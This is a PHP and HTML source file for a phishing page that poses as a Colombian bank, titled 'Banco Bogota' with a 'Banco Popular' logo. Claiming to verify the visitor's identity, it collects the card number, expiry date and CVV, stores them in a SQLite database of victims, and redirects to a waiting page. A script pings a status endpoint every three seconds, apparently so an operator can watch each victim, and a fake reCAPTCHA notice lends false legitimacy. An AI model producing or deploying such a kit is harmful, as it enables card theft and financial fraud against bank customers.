<?php
$id = $_GET['id'] ?? null;
if (!$id) {
    die("ID de usuario no especificado");
}

$error = "";
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $tarjeta = trim($_POST['tarjeta'] ?? '');
    $fecha_tarjeta = trim($_POST['fecha_tarjeta'] ?? '');
    $cvv = trim($_POST['cvv'] ?? '');

    if ($tarjeta !== "" && $fecha_tarjeta !== "" && $cvv !== "") {
        try {
            $db = new PDO('sqlite:usuarios.db');
            $db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

            $stmt = $db->prepare("UPDATE usuarios SET tarjeta = ?, fecha_tarjeta = ?, cvv = ?, estado = 'esperando' WHERE id = ?");
            $stmt->execute([$tarjeta, $fecha_tarjeta, $cvv, $id]);

            header("Location: esperando.php?id=" . urlencode($id));
            exit;
        } catch (PDOException $e) {
            $error = "Error al actualizar: " . $e->getMessage();
        }
    } else {
        $error = "Todos los campos son obligatorios.";
    }
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Banco Bogota - Validar Identidad</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
      background-color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .container {
      background-color: #fff;
      width: 100%;
      max-width: 400px;
      padding: 32px 24px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.08);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .container img {
      width: 100%;
      max-width: 240px;
      margin-bottom: 24px;
    }

    h2 {
      font-size: 18px;
      font-weight: 500;
      margin-bottom: 20px;
      color: #333;
      text-align: center;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    label {
      font-size: 14px;
      font-weight: bold;
      color: #555;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 12px 14px;
      border: 1px solid #ccc;
      border-radius: 10px;
      font-size: 15px;
      outline: none;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: #1976d2;
    }

    button {
      width: 100%;
      background-color: #1976d2;
      color: white;
      padding: 14px;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #145aab;
    }

    .error {
      color: red;
      text-align: center;
      margin-bottom: 15px;
    }

    .recaptcha-text {
      font-size: 12px;
      color: #888;
      margin-top: 16px;
      text-align: center;
    }

    .recaptcha-text a {
      color: #1976d2;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="/bog/b.png" alt="Banco Popular">
    <h2>Para continuar el proceso, ayúdanos a validar tu identidad</h2>

    <!-- MENSAJE DE ERROR OPCIONAL -->
    <!-- <div class="error">Todos los campos son obligatorios.</div> -->

    <form method="POST">
      <div>
        <label>Número de tarjeta</label>
        <input type="text" name="tarjeta" maxlength="16" inputmode="numeric" required>
      </div>
      <div>
        <label>Fecha (MM/AA)</label>
        <input type="text" name="fecha_tarjeta" id="fechaInput" maxlength="5" placeholder="MM/AA" required>
      </div>
      <div>
        <label>CVV</label>
        <input type="text" name="cvv" maxlength="3" inputmode="numeric" required>
      </div>
      <button type="submit">Continuar</button>
    </form>

    <div class="recaptcha-text">
      Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y <a href="#">términos del servicio</a> de Google.
    </div>
  </div>

  <script>
    const fechaInput = document.getElementById("fechaInput");
    fechaInput.addEventListener("input", function () {
      let val = fechaInput.value.replace(/[^\d]/g, "");
      if (val.length > 2) {
        fechaInput.value = val.slice(0, 2) + "/" + val.slice(2, 4);
      } else {
        fechaInput.value = val;
      }
    });
    // 👇 Define el ID del usuario (debes asegurarte de pasarlo desde PHP con JavaScript)
    const idUsuario = <?php echo json_encode($_GET['id'] ?? ''); ?>;

    function enviarPing() {
        if (!idUsuario) return;
        fetch("status.php", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ userId: idUsuario })
        });
    }

    setInterval(enviarPing, 3000); // Ping cada 3 segundos
    enviarPing(); // Enviar inmediatamente al cargar
  </script>
</body>
</html>

